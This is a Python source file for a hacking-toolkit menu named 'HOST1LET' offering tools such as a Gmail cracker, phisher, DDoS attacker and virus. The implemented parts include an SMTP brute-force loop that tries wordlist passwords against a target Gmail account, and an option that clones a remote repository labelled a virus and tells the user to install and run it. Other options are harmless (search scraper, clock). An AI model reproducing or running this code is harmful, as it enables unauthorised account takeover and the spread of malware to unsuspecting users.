from colorama import Fore as f 
from os import system 
import pyfiglet
import smtplib
from requests import get
from fuzzywuzzy import fuzz
from googlesearch import search
from bs4 import BeautifulSoup
from datetime import datetime
from colorama import Fore, Back, Style, init
import csv
import signal
import pandas as pd
import os
import platform
import re
import sys
from argparse import ArgumentParser, RawDescriptionHelpFormatter
from time import monotonic
import requests
from requests_futures.sessions import FuturesSession
from torrequest import TorRequest
from result import QueryStatus
from result import QueryResult
from sites import SitesInformation
from colorama import init


system("cls")

text = "HOST1LET"

print(f"{f.YELLOW}"+pyfiglet.figlet_format(text, font='slant')+"\n"+f"{f.RED}_"*60)



print("")

print(f"{f.BLUE}[{f.RED}1{f.BLUE}] Gmail Cracker"+ f"               {f.BLUE}[{f.RED}2{f.BLUE}] Nmap Tools")
print("")
print(f"{f.BLUE}[{f.RED}3{f.BLUE}] Account User Finder"+ f"         {f.BLUE}[{f.RED}4{f.BLUE}] Search All Over The internet")
print("")
print(f"{f.BLUE}[{f.RED}5{f.BLUE}] Get Virus For Rubika"+ f"        {f.BLUE}[{f.RED}6{f.BLUE}] Time Now")
print("")
print(f"{f.BLUE}[{f.RED}7{f.BLUE}] Get Host By Name"+ f"            {f.BLUE}[{f.RED}8{f.BLUE}] WiFi Cracker")
print("")
print(f"{f.BLUE}[{f.RED}9{f.BLUE}] Max Phisher"+ f"                 {f.BLUE}[{f.RED}10{f.BLUE}] Use Music Player")
print("")
print(f"{f.BLUE}[{f.RED}11{f.BLUE}] IP Tracker"+ f"                 {f.BLUE}[{f.RED}12{f.BLUE}] Ngrok Services")
print("")
print(f"{f.BLUE}[{f.RED}13{f.BLUE}] Unlimited Time"+ f"             {f.BLUE}[{f.RED}14{f.BLUE}] DDoS Attacker")
print("")
print(f"{f.BLUE}[{f.RED}15{f.BLUE}] Use Calculator"+ f"             {f.BLUE}[{f.RED}16{f.BLUE}] Port Scanner")
print("")
print(f"{f.BLUE}[{f.RED}17{f.BLUE}] Logo Maker"+ f"                 {f.BLUE}[{f.RED}18{f.BLUE}] Make Bad USB")
print("")
print(f"{f.BLUE}[{f.RED}19{f.BLUE}] Source Hack Pass Skyroom"+ f"   {f.BLUE}[{f.RED}20{f.BLUE}] Draw Flower")
print("")
print(f"{f.BLUE}[{f.RED}21{f.BLUE}] Pass Generatod"+ f"             {f.BLUE}[{f.RED}22{f.BLUE}] Bot Uploader")
print("")
print(f"{f.BLUE}[{f.RED}23{f.BLUE}] Bot Seen Zan"+ f"               {f.BLUE}[{f.RED}24{f.BLUE}] Auth Dozd")
print("")
print("")
print("")
xx = int(input(f"{f.RED}set{f.WHITE}> "))


if xx == 1:
    gm = str(input(f"{f.BLUE}Enter Gmail With @gmail.com {f.WHITE}> "))
    pas_gm = str(input(f"{f.BLUE}Enter Your PassList Name {f.WHITE}> "))
    filehandler = open(pas_gm, 'r')
    for password in filehandler:
        server = smtplib.SMTP_SSL("stmp.gmail.com", 465)
        server.ehlo()
        try:
            server.login(gm,password)
            print(f"PassWord Of Account is {password}")
            break
        except smtplib.SMTPAuthenticationError:
            print("Wrong Credentials")
            print(f"Wrong Password is {password}")

elif xx == 2:
    print(f"{f.RED}Please Visit This Site >>> https://nmap.org")



elif xx == 4:

    # colorama
    init(autoreset=True)

    # Logo
    print(Fore.YELLOW + '''
    █▀▄▀█ █▀▀█ █▀▀▀ █▀▄▀█ █▀▀█   █▀▀█ █▀▀ ░▀░ █▀▀▄ ▀▀█▀▀
    █░▀░█ █▄▄█ █░▀█ █░▀░█ █▄▄█   █░░█ ▀▀█ ▀█▀ █░░█ ░░█░░
    ▀░░░▀ ▀░░▀ ▀▀▀▀ ▀░░░▀ ▀░░▀   ▀▀▀▀ ▀▀▀ ▀▀▀ ▀░░▀ ░░▀░░
                                    Created by LimerBoy
    ''' )

    query   = input(Back.BLACK + Fore.YELLOW + 'Find > ' + Back.RESET + Fore.WHITE)
    results = 100

    print(Fore.GREEN + '[~] Searching ' + query)
    for url in search(query, stop = results):
        print('\n' + Fore.CYAN + '[+] Url detected: ' + url)
        try:
            text = get(url, timeout = 1).text
        except:
            continue
        soup = BeautifulSoup(text, "html.parser")
        links_detected = []
        try:
            print(Fore.MAGENTA + '[?] Title: ' + soup.title.text.replace('\n', ''))
        except:
            print(Fore.RED + '[?] Title: null')
        # Find by <a> tags
        try:
            for link in soup.findAll('a'):
                href = link['href']
                if not href in links_detected:
                    if href.startswith('http'):
                        # Filter
                        if url.split('/')[2] in href:
                            links_detected.append(href)
                        # If requested data found in url
                        elif query.lower() in href.lower():
                            print(Fore.GREEN + '--- Requested data found at link : ' + href)
                            links_detected.append(href)
                        # If text in link and link location is similar
                        elif fuzz.ratio(link.text, href) >= 60:
                            print(Fore.GREEN + '--- Text and link are similar : ' + href)
                            links_detected.append(href)
        except:
            continue
        if links_detected == []:
            print(Fore.RED + '--- No data found')




elif xx == 5:
    system("git clone https://huggingface.co/spaces/hs1l/FilLe")
    print("")
    print("""
    please Write That : 
    cd FilLe
    pip install -r requirements.txt
    python main.py""")

elif xx == 6:
    tmr = datetime.now()
    print(tmr.strftime("[ %H : %M : %S ]"))
